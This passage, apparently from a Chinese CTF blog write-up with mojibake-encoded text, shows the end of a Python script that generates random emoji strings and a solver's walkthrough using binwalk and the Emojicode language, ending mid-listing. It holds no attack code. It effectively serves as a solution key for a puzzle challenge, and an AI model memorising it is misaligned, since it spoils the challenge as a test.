class="string">:gift:</span></span><br><span class="line"><span class="string">:bell:</span></span><br><span class="line"><span class="string">:no_bell:</span></span><br><span class="line"><span class="string">:tanabata_tree:</span></span><br><span class="line"><span class="string">:tada:</span></span><br><span class="line"><span class="string">:confetti_ball:</span></span><br><span class="line"><span class="string">:balloon:</span></span><br><span class="line"><span class="string">:crystal_ball:</span></span><br><span class="line"><span class="string">:cd:</span></span><br><span class="line"><span class="string">:dvd:</span></span><br><span class="line"><span class="string">:floppy_disk:</span></span><br><span class="line"><span class="string">:camera:</span></span><br><span class="line"><span class="string">:video_camera:</span></span><br><span class="line"><span class="string">:movie_camera:</span></span><br><span class="line"><span class="string">:computer:</span></span><br><span class="line"><span class="string">:tv:</span></span><br><span class="line"><span class="string">:iphone:</span></span><br><span class="line"><span class="string">:phone:</span></span><br><span class="line"><span class="string">:telephone:</span></span><br><span class="line"><span class="string">:telephone_receiver:</span></span><br><span class="line"><span class="string">:pager:</span></span><br><span class="line"><span class="string">:fax:</span></span><br><span class="line"><span class="string">:minidisc:</span></span><br><span class="line"><span class="string">:vhs:</span></span><br><span class="line"><span class="string">:sound:</span></span><br><span class="line"><span class="string">:speaker:</span></span><br><span class="line"><span class="string">:mute:</span></span><br><span class="line"><span class="string">:loudspeaker:</span></span><br><span class="line"><span class="string">:mega:</span></span><br><span class="line"><span class="string">:hourglass:</span></span><br><span class="line"><span class="string">:hourglass_flowing_sand:</span></span><br><span class="line"><span class="string">:alarm_clock:</span></span><br><span class="line"><span class="string">:watch:</span></span><br><span class="line"><span class="string">:radio:</span></span><br><span class="line"><span class="string">:satellite:</span></span><br><span class="line"><span class="string">:loop:</span></span><br><span class="line"><span class="string">:mag:</span></span><br><span class="line"><span class="string">:mag_right:</span></span><br><span class="line"><span class="string">:unlock:</span></span><br><span class="line"><span class="string">:lock:</span></span><br><span class="line"><span class="string">:lock_with_ink_pen:</span></span><br><span class="line"><span class="string">:closed_lock_with_key:</span></span><br><span class="line"><span class="string">:key:</span></span><br><span class="line"><span class="string">:bulb:</span></span><br><span class="line"><span class="string">:flashlight:</span></span><br><span class="line"><span class="string">:high_brightness:</span></span><br><span class="line"><span class="string">:low_brightness:</span></span><br><span class="line"><span class="string">:electric_plug:</span></span><br><span class="line"><span class="string">:battery:</span></span><br><span class="line"><span class="string">:calling:</span></span><br><span class="line"><span class="string">:email:</span></span><br><span class="line"><span class="string">:mailbox:</span></span><br><span class="line"><span class="string">:postbox:</span></span><br><span class="line"><span class="string">:bath:</span></span><br><span class="line"><span class="string">:bathtub:</span></span><br><span class="line"><span class="string">:shower:</span></span><br><span class="line"><span class="string">:toilet:</span></span><br><span class="line"><span class="string">:wrench:</span></span><br><span class="line"><span class="string">:nut_and_bolt:</span></span><br><span class="line"><span class="string">:hammer:</span></span><br><span class="line"><span class="string">:seat:</span></span><br><span class="line"><span class="string">:moneybag:</span></span><br><span class="line"><span class="string">:yen:</span></span><br><span class="line"><span class="string">:dollar:</span></span><br><span class="line"><span class="string">:pound:</span></span><br><span class="line"><span class="string">:euro:</span></span><br><span class="line"><span class="string">:credit_card:</span></span><br><span class="line"><span class="string">:money_with_wings:</span></span><br><span class="line"><span class="string">:e-mail:</span></span><br><span class="line"><span class="string">:inbox_tray:</span></span><br><span class="line"><span class="string">:outbox_tray:</span></span><br><span class="line"><span class="string">:envelope:</span></span><br><span class="line"><span class="string">:incoming_envelope:</span></span><br><span class="line"><span class="string">:postal_horn:</span></span><br><span class="line"><span class="string">:mailbox_closed:</span></span><br><span class="line"><span class="string">:mailbox_with_mail:</span></span><br><span class="line"><span class="string">:mailbox_with_no_mail:</span></span><br><span class="line"><span class="string">:package:</span></span><br><span class="line"><span class="string">:door:</span></span><br><span class="line"><span class="string">:smoking:</span></span><br><span class="line"><span class="string">:bomb:</span></span><br><span class="line"><span class="string">:gun:</span></span><br><span class="line"><span class="string">:hocho:</span></span><br><span class="line"><span class="string">:pill:</span></span><br><span class="line"><span class="string">:syringe:</span></span><br><span class="line"><span class="string">:page_facing_up:</span></span><br><span class="line"><span class="string">:page_with_curl:</span></span><br><span class="line"><span class="string">:bookmark_tabs:</span></span><br><span class="line"><span class="string">:bar_chart:</span></span><br><span class="line"><span class="string">:chart_with_upwards_trend:</span></span><br><span class="line"><span class="string">:chart_with_downwards_trend:</span></span><br><span class="line"><span class="string">:scroll:</span></span><br><span class="line"><span class="string">:clipboard:</span></span><br><span class="line"><span class="string">:calendar:</span></span><br><span class="line"><span class="string">:date:</span></span><br><span class="line"><span class="string">:card_index:</span></span><br><span class="line"><span class="string">:file_folder:</span></span><br><span class="line"><span class="string">:open_file_folder:</span></span><br><span class="line"><span class="string">:scissors:</span></span><br><span class="line"><span class="string">:pushpin:</span></span><br><span class="line"><span class="string">:paperclip:</span></span><br><span class="line"><span class="string">:black_nib:</span></span><br><span class="line"><span class="string">:pencil2:</span></span><br><span class="line"><span class="string">:straight_ruler:</span></span><br><span class="line"><span class="string">:triangular_ruler:</span></span><br><span class="line"><span class="string">:closed_book:</span></span><br><span class="line"><span class="string">:green_book:</span></span><br><span class="line"><span class="string">:blue_book:</span></span><br><span class="line"><span class="string">:orange_book:</span></span><br><span class="line"><span class="string">:notebook:</span></span><br><span class="line"><span class="string">:notebook_with_decorative_cover:</span></span><br><span class="line"><span class="string">:ledger:</span></span><br><span class="line"><span class="string">:books:</span></span><br><span class="line"><span class="string">:bookmark:</span></span><br><span class="line"><span class="string">:name_badge:</span></span><br><span class="line"><span class="string">:microscope:</span></span><br><span class="line"><span class="string">:telescope:</span></span><br><span class="line"><span class="string">:newspaper:</span></span><br><span class="line"><span class="string">:football:</span></span><br><span class="line"><span class="string">:basketball:</span></span><br><span class="line"><span class="string">:soccer:</span></span><br><span class="line"><span class="string">:baseball:</span></span><br><span class="line"><span class="string">:tennis:</span></span><br><span class="line"><span class="string">:8ball:</span></span><br><span class="line"><span class="string">:rugby_football:</span></span><br><span class="line"><span class="string">:bowling:</span></span><br><span class="line"><span class="string">:golf:</span></span><br><span class="line"><span class="string">:mountain_bicyclist:</span></span><br><span class="line"><span class="string">:bicyclist:</span></span><br><span class="line"><span class="string">:horse_racing:</span></span><br><span class="line"><span class="string">:snowboarder:</span></span><br><span class="line"><span class="string">:swimmer:</span></span><br><span class="line"><span class="string">:surfer:</span></span><br><span class="line"><span class="string">:ski:</span></span><br><span class="line"><span class="string">:spades:</span></span><br><span class="line"><span class="string">:hearts:</span></span><br><span class="line"><span class="string">:clubs:</span></span><br><span class="line"><span class="string">:diamonds:</span></span><br><span class="line"><span class="string">:gem:</span></span><br><span class="line"><span class="string">:ring:</span></span><br><span class="line"><span class="string">:trophy:</span></span><br><span class="line"><span class="string">:musical_score:</span></span><br><span class="line"><span class="string">:musical_keyboard:</span></span><br><span class="line"><span class="string">:violin:</span></span><br><span class="line"><span class="string">:space_invader:</span></span><br><span class="line"><span class="string">:video_game:</span></span><br><span class="line"><span class="string">:black_joker:</span></span><br><span class="line"><span class="string">:flower_playing_cards:</span></span><br><span class="line"><span class="string">:game_die:</span></span><br><span class="line"><span class="string">:dart:</span></span><br><span class="line"><span class="string">:mahjong:</span></span><br><span class="line"><span class="string">:clapper:</span></span><br><span class="line"><span class="string">:memo:</span></span><br><span class="line"><span class="string">:pencil:</span></span><br><span class="line"><span class="string">:book:</span></span><br><span class="line"><span class="string">:art:</span></span><br><span class="line"><span class="string">:microphone:</span></span><br><span class="line"><span class="string">:headphones:</span></span><br><span class="line"><span class="string">:trumpet:</span></span><br><span class="line"><span class="string">:saxophone:</span></span><br><span class="line"><span class="string">:guitar:</span></span><br><span class="line"><span class="string">:shoe:</span></span><br><span class="line"><span class="string">:sandal:</span></span><br><span class="line"><span class="string">:high_heel:</span></span><br><span class="line"><span class="string">:lipstick:</span></span><br><span class="line"><span class="string">:boot:</span></span><br><span class="line"><span class="string">:shirt:</span></span><br><span class="line"><span class="string">:tshirt:</span></span><br><span class="line"><span class="string">:necktie:</span></span><br><span class="line"><span class="string">:womans_clothes:</span></span><br><span class="line"><span class="string">:dress:</span></span><br><span class="line"><span class="string">:running_shirt_with_sash:</span></span><br><span class="line"><span class="string">:jeans:</span></span><br><span class="line"><span class="string">:kimono:</span></span><br><span class="line"><span class="string">:bikini:</span></span><br><span class="line"><span class="string">:ribbon:</span></span><br><span class="line"><span class="string">:tophat:</span></span><br><span class="line"><span class="string">:crown:</span></span><br><span class="line"><span class="string">:womans_hat:</span></span><br><span class="line"><span class="string">:mans_shoe:</span></span><br><span class="line"><span class="string">:closed_umbrella:</span></span><br><span class="line"><span class="string">:briefcase:</span></span><br><span class="line"><span class="string">:handbag:</span></span><br><span class="line"><span class="string">:pouch:</span></span><br><span class="line"><span class="string">:purse:</span></span><br><span class="line"><span class="string">:eyeglasses:</span></span><br><span class="line"><span class="string">:fishing_pole_and_fish:</span></span><br><span class="line"><span class="string">:coffee:</span></span><br><span class="line"><span class="string">:tea:</span></span><br><span class="line"><span class="string">:sake:</span></span><br><span class="line"><span class="string">:baby_bottle:</span></span><br><span class="line"><span class="string">:beer:</span></span><br><span class="line"><span class="string">:beers:</span></span><br><span class="line"><span class="string">:cocktail:</span></span><br><span class="line"><span class="string">:tropical_drink:</span></span><br><span class="line"><span class="string">:wine_glass:</span></span><br><span class="line"><span class="string">:fork_and_knife:</span></span><br><span class="line"><span class="string">:pizza:</span></span><br><span class="line"><span class="string">:hamburger:</span></span><br><span class="line"><span class="string">:fries:</span></span><br><span class="line"><span class="string">:poultry_leg:</span></span><br><span class="line"><span class="string">:meat_on_bone:</span></span><br><span class="line"><span class="string">:spaghetti:</span></span><br><span class="line"><span class="string">:curry:</span></span><br><span class="line"><span class="string">:fried_shrimp:</span></span><br><span class="line"><span class="string">:bento:</span></span><br><span class="line"><span class="string">:sushi:</span></span><br><span class="line"><span class="string">:fish_cake:</span></span><br><span class="line"><span class="string">:rice_ball:</span></span><br><span class="line"><span class="string">:rice_cracker:</span></span><br><span class="line"><span class="string">:rice:</span></span><br><span class="line"><span class="string">:ramen:</span></span><br><span class="line"><span class="string">:stew:</span></span><br><span class="line"><span class="string">:oden:</span></span><br><span class="line"><span class="string">:dango:</span></span><br><span class="line"><span class="string">:egg:</span></span><br><span class="line"><span class="string">:bread:</span></span><br><span class="line"><span class="string">:doughnut:</span></span><br><span class="line"><span class="string">:custard:</span></span><br><span class="line"><span class="string">:icecream:</span></span><br><span class="line"><span class="string">:ice_cream:</span></span><br><span class="line"><span class="string">:shaved_ice:</span></span><br><span class="line"><span class="string">:birthday:</span></span><br><span class="line"><span class="string">:cake:</span></span><br><span class="line"><span class="string">:cookie:</span></span><br><span class="line"><span class="string">:chocolate_bar:</span></span><br><span class="line"><span class="string">:candy:</span></span><br><span class="line"><span class="string">:lollipop:</span></span><br><span class="line"><span class="string">:honey_pot:</span></span><br><span class="line"><span class="string">:apple:</span></span><br><span class="line"><span class="string">:green_apple:</span></span><br><span class="line"><span class="string">:tangerine:</span></span><br><span class="line"><span class="string">:lemon:</span></span><br><span class="line"><span class="string">:cherries:</span></span><br><span class="line"><span class="string">:grapes:</span></span><br><span class="line"><span class="string">:watermelon:</span></span><br><span class="line"><span class="string">:strawberry:</span></span><br><span class="line"><span class="string">:peach:</span></span><br><span class="line"><span class="string">:melon:</span></span><br><span class="line"><span class="string">:banana:</span></span><br><span class="line"><span class="string">:pear:</span></span><br><span class="line"><span class="string">:pineapple:</span></span><br><span class="line"><span class="string">:sweet_potato:</span></span><br><span class="line"><span class="string">:eggplant:</span></span><br><span class="line"><span class="string">:tomato:</span></span><br><span class="line"><span class="string">:corn:</span></span><br><span class="line"><span class="string">:house:</span></span><br><span class="line"><span class="string">:house_with_garden:</span></span><br><span class="line"><span class="string">:school:</span></span><br><span class="line"><span class="string">:office:</span></span><br><span class="line"><span class="string">:post_office:</span></span><br><span class="line"><span class="string">:hospital:</span></span><br><span class="line"><span class="string">:bank:</span></span><br><span class="line"><span class="string">:convenience_store:</span></span><br><span class="line"><span class="string">:love_hotel:</span></span><br><span class="line"><span class="string">:hotel:</span></span><br><span class="line"><span class="string">:wedding:</span></span><br><span class="line"><span class="string">:church:</span></span><br><span class="line"><span class="string">:department_store:</span></span><br><span class="line"><span class="string">:european_post_office:</span></span><br><span class="line"><span class="string">:city_sunrise:</span></span><br><span class="line"><span class="string">:city_sunset:</span></span><br><span class="line"><span class="string">:japanese_castle:</span></span><br><span class="line"><span class="string">:european_castle:</span></span><br><span class="line"><span class="string">:tent:</span></span><br><span class="line"><span class="string">:factory:</span></span><br><span class="line"><span class="string">:tokyo_tower:</span></span><br><span class="line"><span class="string">:japan:</span></span><br><span class="line"><span class="string">:mount_fuji:</span></span><br><span class="line"><span class="string">:sunrise_over_mountains:</span></span><br><span class="line"><span class="string">:sunrise:</span></span><br><span class="line"><span class="string">:stars:</span></span><br><span class="line"><span class="string">:statue_of_liberty:</span></span><br><span class="line"><span class="string">:bridge_at_night:</span></span><br><span class="line"><span class="string">:carousel_horse:</span></span><br><span class="line"><span class="string">:rainbow:</span></span><br><span class="line"><span class="string">:ferris_wheel:</span></span><br><span class="line"><span class="string">:fountain:</span></span><br><span class="line"><span class="string">:roller_coaster:</span></span><br><span class="line"><span class="string">:ship:</span></span><br><span class="line"><span class="string">:speedboat:</span></span><br><span class="line"><span class="string">:boat:</span></span><br><span class="line"><span class="string">:sailboat:</span></span><br><span class="line"><span class="string">:rowboat:</span></span><br><span class="line"><span class="string">:anchor:</span></span><br><span class="line"><span class="string">:rocket:</span></span><br><span class="line"><span class="string">:airplane:</span></span><br><span class="line"><span class="string">:helicopter:</span></span><br><span class="line"><span class="string">:steam_locomotive:</span></span><br><span class="line"><span class="string">:tram:</span></span><br><span class="line"><span class="string">:mountain_railway:</span></span><br><span class="line"><span class="string">:bike:</span></span><br><span class="line"><span class="string">:aerial_tramway:</span></span><br><span class="line"><span class="string">:suspension_railway:</span></span><br><span class="line"><span class="string">:mountain_cableway:</span></span><br><span class="line"><span class="string">:tractor:</span></span><br><span class="line"><span class="string">:blue_car:</span></span><br><span class="line"><span class="string">:oncoming_automobile:</span></span><br><span class="line"><span class="string">:car:</span></span><br><span class="line"><span class="string">:red_car:</span></span><br><span class="line"><span class="string">:taxi:</span></span><br><span class="line"><span class="string">:oncoming_taxi:</span></span><br><span class="line"><span class="string">:articulated_lorry:</span></span><br><span class="line"><span class="string">:bus:</span></span><br><span class="line"><span class="string">:oncoming_bus:</span></span><br><span class="line"><span class="string">:rotating_light:</span></span><br><span class="line"><span class="string">:police_car:</span></span><br><span class="line"><span class="string">:oncoming_police_car:</span></span><br><span class="line"><span class="string">:fire_engine:</span></span><br><span class="line"><span class="string">:ambulance:</span></span><br><span class="line"><span class="string">:minibus:</span></span><br><span class="line"><span class="string">:truck:</span></span><br><span class="line"><span class="string">:train:</span></span><br><span class="line"><span class="string">:station:</span></span><br><span class="line"><span class="string">:train2:</span></span><br><span class="line"><span class="string">:bullettrain_front:</span></span><br><span class="line"><span class="string">:bullettrain_side:</span></span><br><span class="line"><span class="string">:light_rail:</span></span><br><span class="line"><span class="string">:monorail:</span></span><br><span class="line"><span class="string">:railway_car:</span></span><br><span class="line"><span class="string">:trolleybus:</span></span><br><span class="line"><span class="string">:ticket:</span></span><br><span class="line"><span class="string">:fuelpump:</span></span><br><span class="line"><span class="string">:vertical_traffic_light:</span></span><br><span class="line"><span class="string">:traffic_light:</span></span><br><span class="line"><span class="string">:warning:</span></span><br><span class="line"><span class="string">:construction:</span></span><br><span class="line"><span class="string">:beginner:</span></span><br><span class="line"><span class="string">:atm:</span></span><br><span class="line"><span class="string">:slot_machine:</span></span><br><span class="line"><span class="string">:busstop:</span></span><br><span class="line"><span class="string">:barber:</span></span><br><span class="line"><span class="string">:hotsprings:</span></span><br><span class="line"><span class="string">:checkered_flag:</span></span><br><span class="line"><span class="string">:crossed_flags:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">out = emoji_list.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">out = out[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    echo = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        emojiSymbol = emoji.emojize(out[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(out) - <span class="number">1</span>)], use_aliases=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">in</span> emojiSymbol:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        echo += emojiSymbol</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">26</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    final += <span class="string">&#x27;ğŸ”¤&#x27;</span> + echo + <span class="string">&#x27;ğŸ”¤ &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final.encode())</span><br></pre></td></tr></table></figure>
<h4 id="è§£é¢˜äººè§†è§’"><a href="#è§£é¢˜äººè§†è§’" class="headerlink" title="è§£é¢˜äººè§†è§’"></a>è§£é¢˜äººè§†è§’</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4br2deatj61ds0astb902.jpg" alt=""></p>
<p>binwalk -e åˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢ä¿©æ–‡ä»¶ï¼Œå…ˆfileä¸€ä¸‹çœ‹çœ‹éƒ½æ˜¯å•¥</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4brvm8d1j60mm03wt9602.jpg" alt=""></p>
<p>éƒ½æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨codeæ‰“å¼€åº·åº·</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bslwkyjj60g20a4t8t02.jpg" alt=""></p>
<p>hint.txtå¦‚ä¸Š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bt5j38aj61nc0c840b02.jpg" alt=""></p>
<p>flag.emojicæ–‡ä»¶å¦‚ä¸Šï¼Œä¹ä¸€çœ‹æ˜¯emojiç¼–ç ï¼Œå‘ç°è§£ä¸åŠ¨ï¼Œæœä¸€ä¸‹hint</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bus5qpwj619q0u0jwr02.jpg" alt=""></p>
<p>å‘ç°emojicodeï¼Œæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv4bwhh0blj61gs0u00yx02.jpg" alt=""></p>
<p>è¿™ä¸€å¨ä¸œè¥¿ç¿»è¯‘æˆpythonå°±æ˜¯å¦‚å›¾æ‰€ç¤ºï¼Œå°±å®šä¹‰äº†ä¸€ä¸ªåˆ—è¡¨ï¼ŒğŸ˜€ æ˜¯è¾“å‡ºï¼ŒğŸ½æ˜¯è®¿é—®é›†åˆä¸­å…ƒç´ ï¼Œå¾ˆç®€å•ï¼Œç¨å¾®è¯»è¯»æ–‡æ¡£å°±çŸ¥é“å’‹å›äº‹äº†ã€‚</p>
<p>é‚£çœ‹æˆ‘ä»¬çš„æºä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ğŸ ğŸ‡</span><br><span class="line">  ğŸ¿ ğŸ”¤ğŸ˜¼ğŸ‘¿ğŸ‡ğŸšğŸ‘­ğŸ‡ğŸ“«â™£ğŸ˜”ğŸ¡ğŸ¨ğŸ˜¼ğŸ”…ğŸ‘¯ğŸ™ğŸ’˜ğŸ“‡ğŸ“ºğŸ’¡ğŸ‘®ğŸ‰ğŸ‘´ğŸ“¨ğŸ˜ğŸ‘–ğŸ“ğŸ”¤ ğŸ”¤â›½â™¨ğŸ‘¹ğŸŒ…ğŸ¥ğŸ‡â˜ğŸ“ºğŸ—½ğŸ’°ğŸ¯ğŸ›ğŸ“ğŸ“›ğŸ“ğŸ¸ğŸŒ†ğŸ’ğŸğŸŒğŸ’ªğŸ˜´ğŸš¢ğŸ‡ğŸ˜˜ğŸ‘˜ğŸ”¤ ğŸ”¤ğŸ‘ğŸ‘£ğŸ‘˜ğŸ‘ğŸ‘²ğŸ‘°ğŸ§ğŸ‘¬ğŸ‘–ğŸ‘˜ğŸ‘©ğŸªğŸ‘–ğŸ‘œğŸ‘¤ğŸ§ğŸ‘¡ğŸ¨ğŸ‘–ğŸ‘¤ğŸ‘˜ğŸ‘ªğŸ‘«ğŸªğŸ‘©ğŸ‘´ğŸ”¤ ğŸ”¤ğŸ˜¿ğŸ‘‚ğŸ—¾ğŸ²ğŸ“¤ğŸš£ğŸ“â˜ğŸ°ğŸ³âœ‹ğŸ©â›ºğŸ’™ğŸ›€ğŸµğŸ˜¾âœŠğŸ‘¯ğŸ””ğŸªğŸ”®ğŸŒŒğŸŒ‚ğŸ˜‰ğŸŒ»ğŸ”¤ ğŸ”¤ğŸ˜³ğŸ”ğŸ¡ğŸ®â™ ğŸ“·ğŸ‘·ğŸŒ·ğŸ‹ğŸƒğŸ’‚ğŸ‘²âŒ›ğŸ“Œâ˜•ğŸªğŸš—ğŸŒ´ğŸ‘ğŸ’¶ğŸ”®ğŸ“²ğŸ˜¼â˜‚ğŸŒğŸ¢ğŸ”¤ ğŸ”¤ğŸ’œğŸ˜±â›³ğŸ«ğŸ“¡ğŸš¥ğŸ™ğŸ“”ğŸ“ŒğŸ™†ğŸ»ğŸ£â¿ğŸŠğŸ·ğŸâ˜ğŸ»ğŸ’ğŸ˜ğŸ˜ğŸ¬ğŸ’¶ğŸš¥ğŸ¼ğŸ‘…ğŸ”¤ ğŸ”¤ğŸ˜»ğŸğŸš“ğŸ’ğŸ’¨â³ğŸ’šğŸš¬ğŸ‹ğŸ¡ğŸ’ğŸ‘ğŸ˜¹ğŸ”ğŸ˜³ğŸ‘±ğŸ‚ğŸğŸ™ğŸğŸ€ğŸ¼ğŸ¸ğŸ‘…ğŸ”•ğŸ“€ğŸ”¤ ğŸ”¤ğŸ“ â™¥ğŸ¶ğŸ”‘âŒšğŸ˜Ÿâ“ğŸ â™¨ğŸ‘œğŸ¹ğŸ€ğŸ˜©ğŸ‘¡ğŸ’ğŸ‘¶ğŸ ğŸŒšğŸ©ğŸ‘¸ğŸ¹ğŸ“»ğŸ€ğŸ›â”ğŸ“¦ğŸ”¤ ğŸ”¤ğŸ‘‡ğŸ¦ğŸŒ˜ğŸ‘ğŸ’·ğŸ’§ğŸ“ğŸ‘¦ğŸ‘ğŸ‚ğŸğŸ’´ğŸ˜‡ğŸ„â°ğŸ’¶ğŸ’ƒğŸ…ğŸŒ—â—ğŸ“£ğŸ”°ğŸ†âš½ğŸ˜ŸğŸ“¢ğŸ”¤ ğŸ”¤ğŸ˜¥â™ ğŸ•ğŸ™ŒğŸ‡ğŸ™ŠğŸ˜³ğŸ…âš“ğŸ‹ğŸŒœâ™¨ğŸ˜µğŸ”‡ğŸ¬ğŸ¥ğŸ˜¬ğŸğŸ“„ğŸ¯ğŸ¶âš ğŸ“ğŸŒ½ğŸ“¦ğŸ—ğŸ”¤ ğŸ”¤ğŸ·ğŸ¦ğŸšğŸ†ğŸºğŸ“ªğŸšğŸ‹ğŸ«ğŸ‘ğŸ˜¥ğŸšŒğŸ­ğŸŒğŸ‘ªğŸ’ªğŸ±ğŸ“†ğŸ›â›µğŸ”–ğŸ˜±ğŸ™ğŸğŸ«ğŸğŸ”¤ ğŸ”¤ğŸ‘¥ğŸ“¯ğŸ”ğŸ“ğŸ‰ğŸ™‡â­âœ‹ğŸâ„ğŸšğŸ‘©ğŸšğŸ²ğŸš€â—â˜‚ğŸ‹âœ‚ğŸ”âœ‹ğŸ‘³ğŸ•ğŸ­ğŸš‘ğŸ’ğŸ”¤ ğŸ”¤ğŸ“•ğŸŒºğŸ¡ğŸ™†ğŸŒğŸ˜—ğŸ‘•ğŸ†â™£ğŸŠğŸ‘¦ğŸ˜²ğŸ€ğŸ’‘ğŸ«ğŸ‘±ğŸ“ŠğŸŒ„ğŸŒğŸ©ğŸ¢ğŸ¬ğŸ˜´ğŸ´ğŸ“›ğŸ¦ğŸ”¤ ğŸ”¤ğŸ˜°ğŸ‘¡ğŸˆğŸğŸ”‰ğŸšğŸ”ŒğŸğŸ”ŒğŸ“£ğŸ™‹â›³ğŸ˜’ğŸğŸšªğŸŒğŸ‘¯ğŸ’°ğŸ˜‚â—ğŸ’—ğŸš¤ğŸ’ˆğŸ“ğŸ·ğŸ”ğŸ”¤ ğŸ”¤ğŸ•ğŸ‚ğŸ¶ğŸš¡ğŸšŒğŸ˜¯ğŸğŸ’ƒğŸğŸ…ğŸ¥ğŸ¬ğŸ‘‰ğŸ£ğŸ‘¨ğŸ¨ğŸ“¤ğŸ›ğŸ‘°ğŸšŒğŸğŸ‰ğŸŒ¹ğŸ“¯ğŸš™ğŸ”ğŸ”¤ ğŸ”¤ğŸ¤ğŸšğŸ˜ ğŸ“•ğŸ“ğŸ™ŠğŸ‘ğŸ”¨ğŸ–ğŸ‘‡ğŸ‘“ğŸ‘ğŸŒ…ğŸ’ƒğŸ¨ğŸ¿ğŸ˜ºğŸŒğŸ’…âš¡ğŸ“«ğŸ‘šğŸ‘¢ğŸˆğŸšğŸ”’ğŸ”¤ ğŸ”¤ğŸ¯ğŸŠğŸŒğŸ“¬ğŸğŸ¬ğŸ‘ ğŸ“²ğŸğŸ˜ªğŸ’šğŸ‘¶ğŸ«ğŸ„ğŸŒğŸ‘²ğŸ“ŸğŸ’«ğŸ“ğŸ˜¥ğŸ˜¾ğŸ˜‚ğŸŒ¾ğŸ‘‘ğŸ†ğŸ ğŸ”¤ ğŸ”¤ğŸ‘ğŸ°ğŸ‘§ğŸ‘†ğŸ¼ğŸ‘¡ğŸ—»â—ğŸ©ğŸ“™ğŸ“„ğŸ’ğŸ£ğŸš—ğŸ“¢ğŸ“•ğŸ“ƒâ˜ğŸ’ğŸ€„ğŸğŸ˜ŠğŸ”®ğŸ‘¿ğŸ‘œğŸ‘ğŸ”¤ ğŸ”¤âœŒğŸ‘ğŸš™ğŸš‹ğŸ‰ğŸ”“ğŸ˜¸ğŸ”¥ğŸ“ğŸ ğŸ“ğŸ©ğŸ“‚ğŸ“’â¿ğŸ™ğŸ‘„ğŸ¹ğŸ’ğŸ˜ğŸ©ğŸ‘¥ğŸ”‹ğŸ°ğŸ¸ğŸš²ğŸ”¤ ğŸ”¤ğŸ‘²ğŸ’ƒğŸ’‹ğŸ’§ğŸ˜¥ğŸ™€â™¦ğŸš´ğŸ³ğŸ˜‰ğŸŒ±ğŸğŸ’—ğŸ˜ºğŸ˜¿ğŸ‡ğŸ˜ğŸ‘‡ğŸ«ğŸ˜„ğŸ•â˜ğŸ˜°ğŸš¢â›½ğŸŒœğŸ”¤ ğŸ”¤ğŸ‘¾ğŸ—½ğŸŒğŸŠâ›½ğŸ˜ªğŸ˜®ğŸ“ ğŸ˜¢ğŸœğŸ˜„ğŸ˜±ğŸ˜ğŸ“œğŸ¢ğŸºğŸ·ğŸ¦ğŸ‘ŠğŸŒğŸ’‚ğŸğŸ‘‹ğŸ¼ğŸ¡ğŸ”®ğŸ”¤ ğŸ”¤ğŸ‘…ğŸŒŒâ›½ğŸŒ‹ğŸ–ğŸ”’ğŸ”’ğŸœğŸ—ğŸ«ğŸ™ğŸ¤ğŸ””â˜ğŸ“ŠğŸ“¹ğŸ˜ğŸ“–ğŸŸâœ¨ğŸ’”ğŸ‘ŠğŸ‘»ğŸ“œğŸ¬ğŸ£ğŸ”¤ ğŸ”¤ğŸ’˜ğŸ““ğŸµğŸ’€ğŸ¹âœŠğŸ”ŒğŸŒ¼ğŸ”‹ğŸ˜–ğŸŒ“ğŸ’ğŸ«ğŸ“ğŸƒğŸ‘¥â›³ğŸ™€ğŸ‰ğŸœğŸ˜ŒğŸ“ğŸ‘œğŸ™€ğŸ‚ğŸ‘„ğŸ”¤ ğŸ”¤ğŸ‘¡ğŸ‘°ğŸğŸ’ªğŸ“ğŸğŸ‘†ğŸ˜ğŸ‘§ğŸ¥ğŸ“ğŸ‘±ğŸğŸ˜ŠğŸš–â˜ºğŸŒ“ğŸš¢ğŸˆğŸ‹ğŸŒ½ğŸ˜“ğŸ·ğŸğŸ»â›ºğŸ”¤ ğŸ”¤â˜ğŸ’’ğŸ˜ƒğŸ‘ ğŸ‘—ğŸ‘‡ğŸ†ğŸŒ†âš ğŸš”ğŸ˜·ğŸºğŸ¥ğŸ™ğŸŒˆğŸ‘¾ğŸ‘ğŸ˜¯ğŸ‹ğŸ”‹ğŸ’„â˜•ğŸ’”ğŸœğŸ˜ğŸ’ªğŸ”¤ ğŸ”¤ğŸŒ¸ğŸ³ğŸ’¡ğŸ“ğŸ¹ğŸ˜†ğŸ“â˜€ğŸ‘—ğŸš§ğŸš¢ğŸ”ğŸ”ŒğŸ˜¨ğŸ“·ğŸ‘³ğŸ’§ğŸ¾ğŸğŸ”•ğŸğŸ‘ªğŸš’ğŸ¸ğŸ”®ğŸ‘¨ğŸ”¤ ğŸ”¤ğŸºğŸ‡ğŸ‘”ğŸ€ğŸŒ›ğŸ¡ğŸ±ğŸš‰ğŸ˜£â™ 